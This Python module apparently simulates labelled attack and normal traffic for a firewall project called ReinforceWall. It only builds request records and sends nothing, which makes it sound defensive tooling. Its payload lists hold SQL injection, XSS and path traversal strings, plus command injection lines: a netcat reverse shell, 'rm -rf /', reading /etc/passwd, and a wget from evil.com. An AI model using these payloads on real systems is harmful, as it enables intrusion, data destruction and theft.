"""
Attack traffic simulator for ReinforceWall.

This module generates synthetic network traffic including normal requests
and various attack patterns (SQL Injection, XSS, Brute Force).
"""

import random
import time
from typing import List, Optional, Dict, Any
from dataclasses import dataclass
from datetime import datetime

from reinforcewall.state import NetworkRequest
from reinforcewall.config import ATTACK_CONFIG


@dataclass
class TrafficPattern:
    """Represents a traffic generation pattern."""
    
    attack_type: str
    probability: float
    requests_per_attack: int
    ip_pool: List[str]
    
    def __init__(self, attack_type: str, probability: float, requests_per_attack: int):
        self.attack_type = attack_type
        self.probability = probability
        self.requests_per_attack = requests_per_attack
        self.ip_pool = []


class AttackSimulator:
    """Simulates network traffic including attacks."""
    
    # SQL Injection patterns
    SQL_INJECTION_PATTERNS = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "1' UNION SELECT NULL--",
        "admin'--",
        "' OR 1=1--",
        "1' OR '1'='1",
        "admin'/*",
    ]
    
    # XSS patterns
    XSS_PATTERNS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(\"XSS\")'>",
        "<body onload=alert('XSS')>",
    ]
    
    # Command Injection patterns
    COMMAND_INJECTION_PATTERNS = [
        "; cat /etc/passwd",
        "| whoami",
        "&& rm -rf /",
        "`id`",
        "$(uname -a)",
        "; ls -la",
        "| nc -e /bin/sh",
        "&& wget http://evil.com/shell.sh",
    ]
    
    # Path Traversal patterns
    PATH_TRAVERSAL_PATTERNS = [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../../windows/win.ini",
        "....//....//windows/system32/config/sam",
    ]
    
    # CSRF patterns (forged requests)
    CSRF_PATTERNS = [
        "csrf_token=stolen_token",
        "authenticity_token=forged",
        "_token=malicious",
    ]
    
    # Phishing patterns
    PHISHING_PATTERNS = [
        "login.php?redirect=evil.com",
        "verify-account?id=stolen",
        "reset-password?token=fake",
        "update-billing?session=hijacked",
    ]
    
    # Common endpoints
    ENDPOINTS = [
        "/",
        "/login",
        "/api/users",
        "/api/data",
        "/search",
        "/profile",
        "/admin",
        "/dashboard",
    ]
    
    # HTTP methods
    HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "HEAD"]
    
    def __init__(self, num_ips: int = 50):
        """
        Initialize attack simulator.
        
        Args:
            num_ips: Number of unique IP addresses to simulate
        """
        self.num_ips = num_ips
        self.ip_pool = self._generate_ip_pool(num_ips)
        self.attack_patterns = self._initialize_attack_patterns()
        
        # Traffic generation state
        self.current_attack: Optional[Dict[str, Any]] = None
        self.attack_remaining_requests = 0
        self.ddos_ips: List[str] = []  # IPs involved in DDoS attack
        self.ddos_ip_index = 0  # Current DDoS IP index
        self.port_scan_index = 0  # Current port scan index
        
    def _generate_ip_pool(self, num_ips: int) -> List[str]:
        """Generate pool of IP addresses."""
        ips = []
        base_ip = "192.168.1."
        
        for i in range(1, min(num_ips + 1, 255)):
            ips.append(f"{base_ip}{i}")
        
        # Add some external IPs
        external_base = "10.0.0."
        for i in range(1, min(num_ips // 2 + 1, 255)):
            ips.append(f"{external_base}{i}")
        
        return ips[:num_ips]
    
    def _initialize_attack_patterns(self) -> Dict[str, TrafficPattern]:
        """Initialize attack patterns."""
        return {
            "sql_injection": TrafficPattern(
                "sql_injection",
                ATTACK_CONFIG.PROB_SQL_INJECTION,
                ATTACK_CONFIG.SQL_INJECTION_REQUESTS
            ),
            "xss": TrafficPattern(
                "xss",
                ATTACK_CONFIG.PROB_XSS,
                ATTACK_CONFIG.XSS_REQUESTS
            ),
            "brute_force": TrafficPattern(
                "brute_force",
                ATTACK_CONFIG.PROB_BRUTE_FORCE,
                ATTACK_CONFIG.BRUTE_FORCE_REQUESTS
            ),
            "ddos": TrafficPattern(
                "ddos",
                ATTACK_CONFIG.PROB_DDOS,
                ATTACK_CONFIG.DDOS_REQUESTS
            ),
            "command_injection": TrafficPattern(
                "command_injection",
                ATTACK_CONFIG.PROB_COMMAND_INJECTION,
                ATTACK_CONFIG.COMMAND_INJECTION_REQUESTS
            ),
            "path_traversal": TrafficPattern(
                "path_traversal",
                ATTACK_CONFIG.PROB_PATH_TRAVERSAL,
                ATTACK_CONFIG.PATH_TRAVERSAL_REQUESTS
            ),
            "port_scanning": TrafficPattern(
                "port_scanning",
                ATTACK_CONFIG.PROB_PORT_SCANNING,
                ATTACK_CONFIG.PORT_SCANNING_REQUESTS
            ),
            "csrf": TrafficPattern(
                "csrf",
                ATTACK_CONFIG.PROB_CSRF,
                ATTACK_CONFIG.CSRF_REQUESTS
            ),
            "mitm": TrafficPattern(
                "mitm",
                ATTACK_CONFIG.PROB_MITM,
                ATTACK_CONFIG.MITM_REQUESTS
            ),
            "phishing": TrafficPattern(
                "phishing",
                ATTACK_CONFIG.PROB_PHISHING,
                ATTACK_CONFIG.PHISHING_REQUESTS
            ),
            "normal": TrafficPattern(
                "normal",
                ATTACK_CONFIG.PROB_NORMAL,
                1
            ),
        }
    
    def generate_traffic(self) -> NetworkRequest:
        """
        Generate a single network request (normal or attack).
        
        Returns:
            NetworkRequest object
        """
        # Check if we're in the middle of an attack
        if self.current_attack and self.attack_remaining_requests > 0:
            return self._generate_attack_request()
        
        # Decide whether to start a new attack
        attack_type = self._select_attack_type()
        
        if attack_type == "normal":
            return self._generate_normal_request()
        else:
            # Start new attack
            if attack_type == "ddos":
                # DDoS involves multiple IPs
                num_ips = min(ATTACK_CONFIG.DDOS_NUM_IPS, len(self.ip_pool))
                self.ddos_ips = random.sample(self.ip_pool, num_ips)
                self.ddos_ip_index = 0
                self.current_attack = {
                    "type": attack_type,
                    "ip": self.ddos_ips[0],  # Primary IP
                    "start_time": time.time(),
                }
            elif attack_type == "port_scanning":
                # Port scanning needs to track ports
                self.port_scan_index = 0
                self.current_attack = {
                    "type": attack_type,
                    "ip": random.choice(self.ip_pool),
                    "start_time": time.time(),
                }
            else:
                # Regular attack with single IP
                self.current_attack = {
                    "type": attack_type,
                    "ip": random.choice(self.ip_pool),
                    "start_time": time.time(),
                }
            
            pattern = self.attack_patterns[attack_type]
            self.attack_remaining_requests = pattern.requests_per_attack
            return self._generate_attack_request()
    
    def _select_attack_type(self) -> str:
        """Select attack type based on probabilities."""
        rand = random.random()
        cumulative = 0.0
        
        for attack_type, pattern in self.attack_patterns.items():
            cumulative += pattern.probability
            if rand <= cumulative:
                return attack_type
        
        return "normal"  # Fallback
    
    def _generate_normal_request(self) -> NetworkRequest:
        """Generate a normal network request."""
        ip_address = random.choice(self.ip_pool)
        timestamp = time.time()
        http_method = random.choice(self.HTTP_METHODS)
        endpoint = random.choice(self.ENDPOINTS)
        
        # Normal payload size (50-2000 bytes)
        payload_size = random.randint(50, 2000)
        
        # Generate normal headers
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
                "Mozilla/5.0 (X11; Linux x86_64)",
            ]),
            "Accept": "text/html,application/json",
        }
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="normal",
            http_method=http_method,
            payload_size=payload_size,
            endpoint=endpoint,
            headers=headers,
            is_attack=False,
        )
    
    def _generate_attack_request(self) -> NetworkRequest:
        """Generate an attack request."""
        if not self.current_attack:
            return self._generate_normal_request()
        
        attack_type = self.current_attack["type"]
        ip_address = self.current_attack["ip"]
        timestamp = time.time()
        
        self.attack_remaining_requests -= 1
        
        # Generate attack-specific request
        if attack_type == "sql_injection":
            return self._generate_sql_injection(ip_address, timestamp)
        elif attack_type == "xss":
            return self._generate_xss(ip_address, timestamp)
        elif attack_type == "brute_force":
            return self._generate_brute_force(ip_address, timestamp)
        elif attack_type == "ddos":
            return self._generate_ddos(timestamp)
        elif attack_type == "command_injection":
            return self._generate_command_injection(ip_address, timestamp)
        elif attack_type == "path_traversal":
            return self._generate_path_traversal(ip_address, timestamp)
        elif attack_type == "port_scanning":
            return self._generate_port_scanning(ip_address, timestamp)
        elif attack_type == "csrf":
            return self._generate_csrf(ip_address, timestamp)
        elif attack_type == "mitm":
            return self._generate_mitm(ip_address, timestamp)
        elif attack_type == "phishing":
            return self._generate_phishing(ip_address, timestamp)
        else:
            return self._generate_normal_request()
    
    def _generate_sql_injection(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate SQL injection attack request."""
        payload = random.choice(self.SQL_INJECTION_PATTERNS)
        payload_size = len(payload.encode('utf-8'))
        
        # SQL injection typically targets login or search endpoints
        endpoint = random.choice(["/login", "/search", "/api/users"])
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="sql_injection",
            http_method="POST",
            payload_size=payload_size,
            endpoint=endpoint,
            headers={
                "User-Agent": "sqlmap/1.0",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            is_attack=True,
        )
    
    def _generate_xss(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate XSS attack request."""
        payload = random.choice(self.XSS_PATTERNS)
        payload_size = len(payload.encode('utf-8'))
        
        # XSS can target various endpoints
        endpoint = random.choice(self.ENDPOINTS)
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="xss",
            http_method="POST",
            payload_size=payload_size,
            endpoint=endpoint,
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; XSSBot/1.0)",
                "Content-Type": "text/html",
            },
            is_attack=True,
        )
    
    def _generate_brute_force(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate brute force attack request."""
        # Brute force typically targets login endpoint
        endpoint = "/login"
        
        # Generate random username/password attempt
        username = random.choice(["admin", "user", "root", "test"])
        password = random.choice(["123456", "password", "admin", "qwerty"])
        payload_size = len(f"{username}:{password}".encode('utf-8'))
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="brute_force",
            http_method="POST",
            payload_size=payload_size,
            endpoint=endpoint,
            headers={
                "User-Agent": "python-requests/2.28.0",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            is_attack=True,
        )
    
    def _generate_ddos(self, timestamp: float) -> NetworkRequest:
        """Generate DDoS attack request (high volume from multiple IPs)."""
        # Rotate through DDoS IPs to simulate distributed attack
        if self.ddos_ips:
            ip_address = self.ddos_ips[self.ddos_ip_index % len(self.ddos_ips)]
            self.ddos_ip_index += 1
        else:
            ip_address = self.current_attack["ip"] if self.current_attack else random.choice(self.ip_pool)
        
        # DDoS attacks are typically GET requests to random endpoints
        endpoint = random.choice(self.ENDPOINTS)
        payload_size = random.randint(100, 500)  # Small payloads, high frequency
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="ddos",
            http_method="GET",
            payload_size=payload_size,
            endpoint=endpoint,
            headers={
                "User-Agent": random.choice([
                    "Mozilla/5.0 (compatible; DDoS-Bot/1.0)",
                    "python-requests/2.28.0",
                    "curl/7.68.0",
                ]),
                "Accept": "*/*",
            },
            is_attack=True,
        )
    
    def _generate_command_injection(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate command injection attack request."""
        payload = random.choice(self.COMMAND_INJECTION_PATTERNS)
        payload_size = len(payload.encode('utf-8'))
        
        # Command injection often targets system endpoints
        endpoint = random.choice(["/api/execute", "/api/system", "/admin/command", "/api/run"])
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="command_injection",
            http_method="POST",
            payload_size=payload_size,
            endpoint=endpoint,
            headers={
                "User-Agent": "curl/7.68.0",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            is_attack=True,
        )
    
    def _generate_path_traversal(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate path traversal attack request."""
        payload = random.choice(self.PATH_TRAVERSAL_PATTERNS)
        payload_size = len(payload.encode('utf-8'))
        
        # Path traversal often targets file access endpoints
        endpoint = random.choice([
            "/api/files",
            "/download",
            "/read",
            "/file",
            "/api/document",
        ])
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="path_traversal",
            http_method="GET",
            payload_size=payload_size,
            endpoint=f"{endpoint}?file={payload}",
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; PathTraversal-Bot/1.0)",
                "Accept": "*/*",
            },
            is_attack=True,
        )
    
    def _generate_port_scanning(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate port scanning attack request."""
        # Sequential port scanning
        ports = ATTACK_CONFIG.PORT_SCANNING_PORTS
        if ports and self.port_scan_index < len(ports):
            port = ports[self.port_scan_index]
            self.port_scan_index += 1
        else:
            # If we've scanned all ports, reuse them
            port = ports[self.port_scan_index % len(ports)] if ports else 80
        
        # Port scanning typically targets root endpoint with different ports
        endpoint = "/"
        payload_size = random.randint(50, 200)  # Small payloads
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="port_scanning",
            http_method="GET",
            payload_size=payload_size,
            endpoint=endpoint,
            headers={
                "User-Agent": "nmap/7.80",
                "Host": f"target.com:{port}",
                "Accept": "*/*",
            },
            is_attack=True,
        )
    
    def _generate_csrf(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate CSRF attack request."""
        payload = random.choice(self.CSRF_PATTERNS)
        payload_size = len(payload.encode('utf-8'))
        
        # CSRF typically targets state-changing endpoints
        endpoint = random.choice(["/api/transfer", "/api/update", "/admin/change", "/user/settings"])
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="csrf",
            http_method="POST",
            payload_size=payload_size,
            endpoint=endpoint,
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; CSRF-Bot/1.0)",
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "http://evil-site.com",
            },
            is_attack=True,
        )
    
    def _generate_mitm(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate MITM attack request (simulated as suspicious proxying)."""
        # MITM attacks often involve intercepting and modifying requests
        endpoint = random.choice(self.ENDPOINTS)
        payload_size = random.randint(200, 1500)
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="mitm",
            http_method=random.choice(["GET", "POST"]),
            payload_size=payload_size,
            endpoint=endpoint,
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; MITM-Proxy/1.0)",
                "X-Forwarded-For": "192.168.1.1",  # Suspicious proxy header
                "Via": "1.1 proxy.example.com",
            },
            is_attack=True,
        )
    
    def _generate_phishing(
        self,
        ip_address: str,
        timestamp: float
    ) -> NetworkRequest:
        """Generate phishing attack request."""
        payload = random.choice(self.PHISHING_PATTERNS)
        payload_size = len(payload.encode('utf-8'))
        
        # Phishing typically targets login/verification endpoints
        endpoint = random.choice(["/login", "/verify", "/reset-password", "/update-account"])
        
        return NetworkRequest(
            ip_address=ip_address,
            timestamp=timestamp,
            payload_type="phishing",
            http_method="GET",
            payload_size=payload_size,
            endpoint=f"{endpoint}?{payload}",
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; Phishing-Bot/1.0)",
                "Referer": "http://fake-bank.com",
            },
            is_attack=True,
        )
    
    def reset(self):
        """Reset simulator state."""
        self.current_attack = None
        self.attack_remaining_requests = 0
        self.ddos_ips = []
        self.ddos_ip_index = 0
        self.port_scan_index = 0

